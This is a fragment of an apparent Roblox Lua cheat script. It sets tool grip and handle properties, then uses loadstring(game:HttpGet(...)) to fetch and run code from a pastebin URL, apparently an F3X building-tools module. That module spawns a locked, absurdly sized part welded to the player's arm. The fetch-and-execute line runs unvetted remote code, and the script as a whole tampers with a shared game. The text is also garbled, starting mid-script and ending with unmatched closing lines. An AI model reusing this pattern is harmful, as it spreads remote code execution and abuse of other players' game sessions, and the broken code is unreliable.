Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-7.85,9.45,0)*  CFrame.new(0.15,18,0.8)  wait()     

       part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=10604848"

       duck.TextureId = "http://www.roblox.com/asset/?id=10605252"

       



		duck.Scale = Vector3.new(5.5, 5.5, 5.5)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



    end)

end)
